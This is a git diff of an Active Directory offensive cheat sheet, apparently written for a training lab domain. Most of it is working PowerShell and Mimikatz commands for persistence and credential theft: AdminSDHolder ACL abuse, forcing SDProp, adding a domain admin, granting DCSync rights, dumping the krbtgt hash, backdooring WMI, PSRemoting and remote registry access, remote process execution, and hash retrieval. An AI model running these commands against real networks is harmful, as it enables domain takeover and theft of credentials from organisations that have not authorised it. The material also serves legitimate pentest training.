@@ -864,53 +864,100 @@ $packages = Get-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig 
 $packages += "mimilib"
 Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -value $packages
 Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -value $packages
-
-
 ```
+
 ### AdminSDHolder
-- **Idea is to Abuse the object AdminSDHolder and change its ACL to affect ACL of protected groups (Domain admins and similar)**
 ```powershell
-# Command to give to attacker user full privilege to AdminSDHolder
-Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Verbose -Rights All
-# in about 60 minutes  this ACL is propageted to domain admin groups and other privileged groups
-# It also can be forced in a few ways
-# modifying the registry 
-REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300 
-# or using a script InvokeSDPropagator
-# After that, the user attacker can add members to "domain admins" group or can add DCSync rights and execute a DCSync 
-```
+# There is a OU who is used as a reference for ACL on Protected groups
+# every 60 minutes there's a scheduled task that replace ACL on "Domain ADmins" "Server admins" "Backup operator" (etc..) groups
+# This to revert dangerous changes to ACL on this protected group
+# Persistence can be obatined by changing te ACL to this OU named AdminSDHolder
 
+# This command gives full access on AdminSDHolder to user "attacker" with Powerview
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity attacker -Verbose -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
+
+# Other rights can be interesting like "ResetPassword" or "WriteMembers"
+
+# In about 60 minutes  this ACL is propageted to domain admin groups and other privileged groups
+
+# It also can be forced in a few ways
+
+# 1. modifying the registry 
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300 
+
+# 2. using a script InvokeSDPropagator
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+
+$sess = New-PSSession -computername dcorp-dc
+Invoke-Command -Session $sess -FilePath c:\tools\Invoke-SDPropagator.ps1
+Invoke-SDPropagator
+
+# After that, the user attacker can add new_da user to "domain admins" group  
+Add-DomainGroupMemeber -Identity 'Domain admins' -Members new_da -Vrebose
+
+# and reset password to a domain admin
+Set-DomainUserPasword -Identity new_da (ConvertTo-SecureString "Passw0rd123!" -AsPlainTet -Force) -Verbose
+``` 
+
+### ACL on Domain OUs
+```powershell
+# Other interesting persistence can be obtained by giving a full access to a owned user
+Add-DomainObjectAcl -TargetIdentity 'dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity student1 -Verbose -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
+
+# OR give Dcysnc rights
+Add-DomainObjectAcl -TargetIdentity 'dc=dollarcorp,dc=moneycorp,dc=loc' -PrincipalIdentity student1 -Verbose -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local
+```
 
 ### DCSync
 
 - **With PowerView and Invoke-Mimikatz:**
 ```powershell
-# Check if user01 has these permissions
-Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
-
-# If you are a domain admin, you can grant this permissions to any user
-Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose
 
 # Gets the hash of krbtgt (it is the most static user and can be used for impersonating other
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 ### ACL for WMI, PSRemoting and remote Registry
-
- - **With Powershell:**
 ```powershell
+
+# SDDL Primer
+Ace_type;ace_Flags;rights;object_guid,inherit_object_guid;account_SID
+A;CI;CCDCLCSWRPWPRCWD;;;SID
+# - A Stand for Access Allowed (D= Denied, AU= System Audit,etc..=
+# - CI means "Container Inherit" (OI=Object Inherit, NP: No propagate)
+# rights
+# - CC: Create child
+# - DC: Delete Child 
+# - LC: List Content
+# - SW:  All vaoidated Writes
+# - RP: Read All Properties
+# - WP: Write All Properties
+# - RC: Read Permission
+# - WD: Write Permission
+
+# With the tool RACE.ps1 it's possible to set WMI permission
+
 # Check access as current user (should output information)
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
-# Give access to Remote WMI (root\cimv2 namespace) for user01 on computer dcorp-dc by administrator
-Set-RemoteWmi -UserName user01 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Verbose
-# Remove access to WMI
-Set-RemoteWmi -UserName user01 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Remove -Verbose
+
+# Give access to Remote WMI (root\cimv2 namespace) for local macihne
+Set-RemoteWmi -SamAccountName student1  -Verbose
+
+# Add access to Remote WMI on computer dcorp-dc (second one is with explicit credentials)
+Set-RemoteWmi -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'  -Verbose
+Set-RemoteWmi -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Credential Administrator -Verbose
+# The -Remove option remove permission to WMI
+
 
 # Set access via PSRemoting 
-Set-RemotePSRemoting -UserName user01 -ComputerName dcorp-dc -Verbose
+Set-RemotePSRemoting -SAMAccountName student1 -ComputerName dcorp-dc -Verbose
 
-# Set access to remote registry for user01 (needs DAMP)
-Add-RemoteRegBackdoor -Trustee user01 -ComputerName dcorp-dc -Verbose
+# Execute a process via WMI (maybe a reverse shell):
+Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList 'calc.exe' -ComputerName dcorp-dc
+
+# Set access to remote registry for student11 (needs DAMP)
+Add-RemoteRegBackdoor -Trustee student1 -ComputerName dcorp-dc -Verbose
+
 # Retrieve hashes (machine, local and domain):
 Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
 Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
